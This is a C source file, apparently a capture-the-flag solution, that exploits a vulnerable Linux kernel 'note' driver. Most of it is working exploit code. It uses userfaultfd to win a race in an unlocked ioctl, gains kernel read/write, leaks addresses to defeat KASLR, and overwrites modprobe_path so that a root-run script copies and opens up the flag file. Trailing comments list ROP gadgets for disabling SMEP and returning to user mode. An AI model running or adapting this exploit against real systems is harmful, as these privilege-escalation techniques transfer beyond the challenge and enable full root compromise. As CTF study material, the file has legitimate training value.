// gcc -static -pthread xx.c -g -o xx
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

typedef struct _noteRequest
{
	size_t idx;
	size_t length;
	char* userptr;
}noteRequest;

int fd;
void init()
{
	fd = open("/dev/note", 0);
	if (fd<0)
		exit(-1);
	puts("[+] init done!");
}
void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

void create(char* buf, uint8_t length)
{
	noteRequest req;
	req.length  = length;
	req.userptr = buf;
	if (ioctl(fd, -256, &req) < 0)
		errExit("[-] Failed to create!");
}

void edit(uint8_t idx, char* buf, uint8_t length)
{
	noteRequest req;
	req.length  = length;
	req.userptr = buf;
	req.idx     = idx;
	if (ioctl(fd, -255, &req) < 0)
		errExit("[-] Failed to edit!");
}

void show(uint8_t idx, char* buf)
{
	noteRequest req;
	req.userptr = buf;
	req.idx     = idx;
	if (ioctl(fd, -254, &req) < 0)
		errExit("[-] Failed to show!");
}

void delete()
{
	noteRequest req;
	if (ioctl(fd, -253, &req) < 0)
		errExit("[-] Failed to delete!");
}

char buffer[0x1000];
#define FAULT_PAGE ((void*)(0x1337000))

void* handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] Handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd     = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	if (nready != 1)  // 这会一直等待，直到copy_from_user访问FAULT_PAGE
		errExit("[-] Wrong pool return value");
	printf("[+] Trigger! I'm going to hang\n");

	//现在主线程停在copy_from_user函数了，可以进行利用了
	delete();
	create(buffer, 0);
	create(buffer, 0);
	// 原始内存：note0 struct + 0x10 buffer
	// 当前内存：note0 struct + note1 struct
	// 当主线程继续拷贝时，就会破坏note1区域

	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 偶从uffd读取msg结构，虽然没用
		errExit("[-] Error in reading uffd_msg");

	struct uffdio_copy uc;
	memset(buffer, 0, sizeof(buffer));
	buffer[8] = 0xf0; //把note1 的length改成0xf0

	uc.src = (unsigned long)buffer;
	uc.dst = (unsigned long)FAULT_PAGE;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);  // 恢复执行copy_from_user

	puts("[+] done 1");
	return NULL;
}

void register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1) // create the user fault fd
		errExit("[-] ioctl-UFFDIO_API");
	if (mmap(FAULT_PAGE, 0x1000, 7, 0x22, -1, 0) != FAULT_PAGE)//create page used for user fault
		errExit("[-] mmap fault page");

	ur.range.start = (unsigned long)FAULT_PAGE;
	ur.range.len   = 0x1000;
	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("[-] ioctl-UFFDIO_REGISTER"); //注册页地址与错误处理fd，这样只要copy_from_user
	                                  //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if (s!=0)
		errExit("[-] pthread_create"); // handler函数进行访存错误处理
}

int main(int argc, char const *argv[])
{
	init();
	create(buffer, 0x10);  // memory layout: note struct + 0x10 buffer
	register_userfault();  // register the user fault
	edit(0, FAULT_PAGE, 1);
	       /* 漏洞在于edit没有实现锁，所以执行到copy_from_user时访存错误被挂起，
	       notes被其他线程篡改，copy_from_user继续运行时导致OOB 和 R&W */
	// 1.leak key
	show(1, buffer);
	unsigned long key = *(unsigned long *)buffer; 

	create(buffer, 0);   // note2: can be overwritten

	// 2. leak module base
	show(1,buffer);      
	unsigned long bss_addr = *(unsigned long*) (buffer + 0x10) ^ key;
	unsigned long module_base = bss_addr - 0x2568;
	printf("[+] key=0x%lx     module_base=0x%lx\n", key, module_base);

    // 3. leak base addr, not kernel_base
    unsigned long page_offset_base = module_base + 0x1fa;
	unsigned long* fake_note = (unsigned long*)buffer;
	fake_note[0] = 0 ^ key;
	fake_note[1] = 4 ^ key;
	fake_note[2] = page_offset_base ^ key;
	edit(1, buffer, 0x18);
	int page_offset_base_offset;
	show(2, (char*)&page_offset_base_offset);
	printf("[+] page_offset_base_offset = 0x%x\n", page_offset_base_offset);
	       //0x1f7处是指令 .text:00000000000001F7                 mov     r12, cs:page_offset_base
		   //             .text:00000000000001FE                 add     r12, [rax+10h]
	// 计算存基址的地址，并读出该地址
	page_offset_base = module_base + 0x1fe + page_offset_base_offset;
	printf("[+] page_offset_base = 0x%lx\n", page_offset_base);
	fake_note[1] = 8 ^ key;
	fake_note[2] = page_offset_base ^ key;
	edit(1, buffer, 0x18);
	unsigned long base_addr;
	show(2, (char *)&base_addr);
	printf("[+] base_addr = 0x%lx\n", base_addr);

    // 4. leak kernel base          .text:000000000000006C      call    _copy_from_user
    module_base = module_base + base_addr;
    printf("[+] real module_base = 0x%lx\n", module_base);
    fake_note[0] = 0 ^ key;
    fake_note[1] = 8 ^ key;
    fake_note[2] = (module_base + 0x6c + 1 - base_addr) ^ key;
    edit(1, buffer, 0x18);
    int copy_from_user_offset;
    show(2, (char *)&copy_from_user_offset);
    unsigned long copy_from_user_addr = module_base + 0x6c + 5 + copy_from_user_offset;
    unsigned long kernel_base = copy_from_user_addr - (0xae553e80-0xae200000);
    printf("[+] kernel_base = 0x%lx\n", kernel_base);

    // 5. hijack modprobe_path
    unsigned long modprobe_path = kernel_base + (0xb1c5e0e0 - 0xb0c00000);
    printf("[+] modprobe_path = %p\n", modprobe_path);
    char *buf = malloc(0x50);
    memset(buf, '\x00', 0x50);
    strcpy(buf, "/home/note/copy.sh\0");
    fake_note[0] = 0 ^ key;
    fake_note[1] = 0x20 ^ key;
    fake_note[2] = (modprobe_path - base_addr) ^ key;
    edit(1, buffer, 0x18);
    edit(2, buf, 20);

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/note/flag\n/bin/chmod 777 /home/note/flag' > /home/note/copy.sh");
	system("chmod +x /home/note/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/note/dummy");
	system("chmod +x /home/note/dummy");
    system("/home/note/dummy");
    system("cat flag");
    int p;
    printf("[*] Wait for a while!");   /// 
    scanf("%c",&p);
    return 0;
}

/*
泄露kernel_base
$ cat /proc/kallsyms | grep startup_64
0xffffffff83800000 T startup_64
$ cat /proc/kallsyms | grep note
0xffffffffc0275400 t init_module	[note]
pwndbg> b *0xffffffffc0275400+0x6c
0xffffffffc027506c    call   0xffffffff83b53e80
pwndbg> x /20xg 0xffffffffc0275000+0x6c
0xffffffffc027506c:	0xc08548c38dee0fe8   0xc38dee0f

.text:000000000000006C                 call    _copy_from_user
E8 7F 2B 00 00
0xffffffffc027506c+5+0xc38dee0f =  0x83b53e80
*/

/*
0xfffffe6f; mov cr4, rdi; ret; 
0x81002e21: pop rdi; ret; 
0x81066440: swapgs; ret; 
0x810352a7: iretq; ret; 
*/